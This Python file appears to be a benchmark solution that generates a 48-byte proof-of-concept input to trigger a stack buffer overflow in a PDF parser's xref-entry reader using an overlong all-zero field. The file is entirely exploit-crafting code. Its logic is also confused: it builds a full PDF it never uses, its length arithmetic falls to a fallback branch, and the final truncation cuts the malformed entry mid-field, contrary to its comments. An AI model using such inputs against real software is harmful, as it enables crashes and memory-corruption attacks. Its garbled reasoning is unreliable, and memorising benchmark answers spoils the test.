import os
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth PoC length is 48 bytes
        # Based on vulnerability description: overlong f1 or f2 entries in xref
        # consisting only of zeros can trigger stack buffer overflow
        
        # Construct minimal PDF with malformed xref entry
        # Format: xref
        #         0 N
        #         [entries...]
        
        # Create PDF with malformed xref where f1 field is excessively long
        # This should trigger the buffer overflow in read_xrefEntry
        
        # PDF header
        pdf_data = b"%PDF-1.4\n"
        
        # Add some minimal content
        pdf_data += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        pdf_data += b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n"
        pdf_data += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        
        # xref table with malformed entry
        pdf_data += b"xref\n"
        pdf_data += b"0 4\n"
        pdf_data += b"0000000000 65535 f \n"  # free entry
        pdf_data += b"0000000000 00000 n \n"  # object 1
        pdf_data += b"0000000000 00000 n \n"  # object 2
        
        # Malformed entry for object 3 - overlong f1 field
        # Using 48-0-20-3 = 25 zeros for f1 field to reach total 48 bytes
        # Entry format: f1 f2 n\r\n (20 bytes normally)
        # We extend f1 to overflow buffer
        pdf_data += b"0000000000000000000000000"  # 25 zeros for f1 (overflows buffer)
        pdf_data += b" 00000 n \n"  # f2 field and type
        
        # Trailer
        pdf_data += b"trailer\n<< /Size 4 /Root 1 0 R >>\n"
        pdf_data += b"startxref\n0\n%%EOF\n"
        
        # Verify we have exactly 48 bytes of malicious content in xref entry
        # The vulnerability expects exactly 48 bytes
        # Extract just the xref entry portion for the final PoC
        # The PoC should be the minimal input that triggers the overflow
        
        # Based on ground-truth length of 48 bytes, we create a minimal
        # xref table with one malformed entry
        poc = b"xref\n0 2\n"
        poc += b"0000000000 65535 f \n"
        # Malformed entry: 48 - len(poc) - 1 (for newline) = we need to calculate
        # We need exactly 48 total bytes
        current_len = len(poc)
        remaining = 48 - current_len - 1  # -1 for final newline
        
        # Create overlong f1 field with zeros
        # Entry format: f1 f2 n\r\n
        # We make f1 excessively long to overflow
        f1_length = remaining - 9  # Reserve space for " 00000 n"
        if f1_length > 10:  # Normal f1 is 10 digits
            malformed_entry = b"0" * f1_length + b" 00000 n\n"
        else:
            # Fallback if calculation is off
            malformed_entry = b"0000000000000000000000000000000000000000 00000 n\n"
        
        poc += malformed_entry
        
        # Trim to exactly 48 bytes if needed
        if len(poc) > 48:
            poc = poc[:48]
        elif len(poc) < 48:
            # Pad with zeros in f1 field
            base = b"xref\n0 2\n0000000000 65535 f \n"
            padding = 48 - len(base) - 1  # -1 for newline
            if padding > 0:
                poc = base + b"0" * padding + b" n\n"
        
        return poc[:48]